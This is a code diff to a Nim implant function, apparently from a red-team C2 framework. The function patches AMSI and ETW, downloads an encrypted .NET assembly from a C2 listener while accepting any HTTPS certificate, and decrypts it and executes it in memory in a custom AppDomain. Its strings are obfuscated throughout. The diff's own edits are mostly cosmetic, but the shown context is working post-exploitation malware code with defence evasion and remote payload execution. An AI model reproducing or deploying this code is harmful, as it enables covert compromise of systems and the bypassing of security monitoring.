@@ -36,6 +36,8 @@ import puppy
 const VT_UI1 = 17
 
 proc executeAssembly*(li: Listener, args: varargs[string]): string =
+  var result = ""
+  
   ##########################################################
   # Check if the user has provided the correct arguments
   ##########################################################
@@ -46,6 +48,7 @@ proc executeAssembly*(li: Listener, args: varargs[string]): string =
     amsiFlagStr: string = args[0]
     etwFlagStr: string = args[1]
     fileId: string = args[2]
+  
   var
     amsi: bool = false
     etw: bool = false
@@ -79,7 +82,6 @@ proc executeAssembly*(li: Listener, args: varargs[string]): string =
     else: result.add(obf("[?] Unknown ETW patching result!\n"))
   ##########################################################
 
-
   ##########################################################
   # Call C2 Server and download assembly
   ##########################################################
@@ -88,25 +90,24 @@ proc executeAssembly*(li: Listener, args: varargs[string]): string =
     url &= li.listenerHost
   else:
     url &= li.implantCallbackIp & obf(":") & li.listenerPort
-    url &= li.taskpath & obf("/") & fileId
+  url &= li.taskpath & obf("/") & fileId
 
   let req = Request(
     url: parseUrl(url),
     headers: @[
       Header(key: obf("User-Agent"), value: li.userAgent),
       Header(key: obf("X-Request-ID"), value: li.id),
-      Header(key: obf("Content-MD5"), value: "execute-assembly"),
-      Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey)
+      Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey),
+      Header(key: obf("Content-MD5"), value: "execute-assembly")
     ],
     allowAnyHttpsCertificate: true,
   )
-  
+    
   let res: Response = fetch(req)
   if res.code != 200:
     return result & obf("[-] Error getting assembly file: The server returned a non-200 code.\n")
   ##########################################################
 
-  
   try:
     ##########################################################
     # Decrypt and decompress assembly
@@ -161,11 +162,9 @@ proc executeAssembly*(li: Listener, args: varargs[string]): string =
     
     ##########################################################
     # Load the assembly in the custom AppDomain
-    #
-    #  
+    ##########################################################
     result.add(obf("[*] Loading assembly in the AppDomain...\n"))
     var assembly: CLRVariant
-
 
     ##########################################################  
     # Strange trick to load the assembly, yeah both ways are needed, first try will fail
@@ -189,7 +188,7 @@ proc executeAssembly*(li: Listener, args: varargs[string]): string =
 
     ##########################################################
     # Convert command line arguments to CLR format
-    #
+    ##########################################################
     result.add(obf("[*] Preparing arguments for the assembly...\n"))
     var clrArgs = toCLRVariant(assemblyArgs, VT_BSTR)
     ##########################################################
@@ -215,7 +214,7 @@ proc executeAssembly*(li: Listener, args: varargs[string]): string =
 
       ##########################################################
       # Lets execute the assembly
-      #
+      ##########################################################
       try:
         # Redirect standard output and error
         @consoleType.SetOut(sw)
